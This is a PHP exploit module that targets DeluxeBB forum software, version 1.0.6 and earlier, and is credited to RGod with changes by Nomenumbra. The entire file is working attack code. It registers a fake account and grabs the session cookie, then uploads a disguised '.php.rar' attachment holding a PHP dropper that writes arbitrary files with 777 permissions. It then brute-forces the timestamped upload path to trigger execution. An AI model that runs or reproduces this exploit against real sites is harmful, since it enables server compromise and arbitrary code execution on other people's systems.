<?

/*
  DeluxeBB <= 1.0.6 Exploit, by RGod, modified as an ouroboros module by Nomenumbra
*/

class dbb extends Xploit {

function greenwich_timestamp($response)
{
   $temp=explode("Date: ",$response);
   $temp2=explode("\r\n",$temp[1]);
   $is_now=$temp2[0];
   $temp=explode(" ",$is_now);$day=$temp[1];$month=$temp[2];$year=$temp[3];$temp2=explode(":",$temp[4]);
   $hour=$temp2[0];$min=$temp2[1];$sec=$temp2[2];
   $tb=array ('Jan', '1','Feb', '2','Mar', '3','Apr', '4','May', '5','Jun', '6',
   'Jul', '7','Aug', '8','Sep', '9','Oct', '10','Nov', '11','Dec', '12');
   for ($i=0;$i<=23;$i++) {if ($month==$tb[$i]) {$month=$tb[$i+1];break;}}
   return mktime($hour,$min,$sec,$month,$day,$year);
}

function gmtime() {    // Get GM offset.
   return time() - (int) date('Z');
}

function Sploit($host,$port,$path,$filename,$filecontent)
{
  $p='http://'.$host.':'.$port.$path;

  $difftime=0;
  $packet ="HEAD / HTTP/1.1\r\nHost: ".$host."\r\nConnection: Close\r\n\r\n";
  sendpacket($host,$port,$packet);
  if (eregi("Date: ",$html))
  {
    $itstime=$this->greenwich_timestamp($html);
    $mytime=$this->gmtime();
    $difftime= $itstime-$mytime;
  }
  srand(make_seed());
  $anumber = rand(1,99999);
  $username = "USR".$anumber;
  $password = "PSW".$anumber;
  $data="name=".$username;
  $data.="&pass=".$password;
  $data.="&pass2=".$password;
  $data.="&email=".$username."%40gmail.com";
  $data.="&hideemail=1";
  $data.="&languagex=English";
  $data.="&xthetimeoffset=2";
  $data.="&xthedateformat=d-m-Y";
  $data.="&xthetimeformat=24";
  $data.="&submit=Register";
  $packet ="POST ".$p."misc.php?sub=register HTTP/1.0\r\n";
  $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
  $packet.="User-Agent: Googlebot/2.1\r\n";
  $packet.="Content-Length: ".strlen($data)."\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  $packet.=$data;
  $html = sendpacket($host,$port,$packet);
  $temp=explode("Set-Cookie: ",$html);
  $cookie="";
  for ($i=1; $i<=count($temp)-1; $i++)
  {
    $temp2=explode(" ",$temp[$i]);
    $cookie.=" ".$temp2[0];
  }

/*
Attachment dropper
*/

$attachment='
<?php
  $fp=fopen("'.$filename.'","w");
  fputs($fp,"'.$filecontent.'");
  fclose($fp);
  chmod("'.$filename.'",777);
?>';

$falsefilename = $filename.".php.rar";
$whatwhat = $username." says hello";
$subject = $username."'s greetings!";

$data='-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="subject"

'.$subject.'
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="posticon"

None
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="disablesmilies"

1
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="fileupload"; filename="'.$falsefilename.'"
Content-Type: application/octet-stream

'.$attachment.'
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1048576
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="what"

'.$whatwhat.'
-----------------------------7d6ee3a7074a
Content-Disposition: form-data; name="submit"

Post
-----------------------------7d6ee3a7074a--
';

  $packet ="POST ".$p."newpost.php?sub=newthread&fid=1 HTTP/1.0\r\n";
  $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6ee3a7074a\r\n";
  $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Content-Length: ".strlen($data)."\r\n";
  $packet.="Cookie: ".$cookie."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  $packet.=$data;
  $mytime=time() + $difftime;
  sendpacket($host,$port,$packet);
  sleep(2);
  $predict_time=
            array (
             $mytime,
             $mytime + 1,
             $mytime + 2,
             $mytime + 3,
             $mytime + 4,
             $mytime + 5,
             $mytime + 6
             );

for ($i=0; $i<=count($predict_time)-1; $i++)
{
  $a=3+$i;
  $packet ="GET ".$p."files/".$filename.".php-".$predict_time[$i].".ext HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  $html = sendpacket($host,$port,$packet);
  if (strstr($html,"No response"))
   return false;
  sleep(2);

  $packet ="GET ".$p."files/".$filename." HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  $html = sendpacket($host,$port,$packet);
  if (strstr($html,$MAIN['signature']))
    return true;
}
  return false;
}

}

?>

